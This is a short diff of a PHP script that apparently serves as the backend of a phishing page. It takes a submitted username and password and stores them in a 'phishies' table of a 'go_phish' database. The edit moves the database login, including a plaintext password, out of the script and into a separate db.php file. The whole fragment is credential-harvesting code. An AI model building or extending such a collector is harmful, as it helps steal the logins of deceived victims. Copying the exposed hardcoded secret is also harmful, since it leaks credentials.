@@ -3,12 +3,8 @@
 	$password = $_POST["password"];
 	
 	if($username && $password) {
-		//db credentials
-		require_once 'meekrodb.2.3.class.php';
-		DB::$user = 'phisher';
-		DB::$password = 'HBkgQsw0yK6otwr2';
-		DB::$dbName = 'go_phish';
-		
+		require("db.php");
+				
 		//insert the items into the db
 		DB::insert('phishies', array(
 			'username' => $username,
